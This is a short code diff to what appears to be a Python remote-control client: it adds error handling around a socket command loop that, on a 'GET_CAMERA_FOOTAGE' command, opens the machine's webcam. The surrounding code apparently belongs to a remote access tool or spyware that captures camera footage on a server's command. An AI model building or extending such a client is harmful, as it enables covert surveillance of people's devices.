@@ -132,7 +132,12 @@ print('[CONNECTION] Connected to the server.')
 print('[LOG] Listening for commands.')
 
 while True:
-    command = s.recv(300).decode('utf-8')
+    try:
+        command = s.recv(300).decode('utf-8')
+    except ConnectionResetError:
+        print("Error: Server offline.")
+        while True:
+            pass
 
     if command == 'GET_CAMERA_FOOTAGE':
         vid = cv2.VideoCapture(0, cv2.CAP_DSHOW)
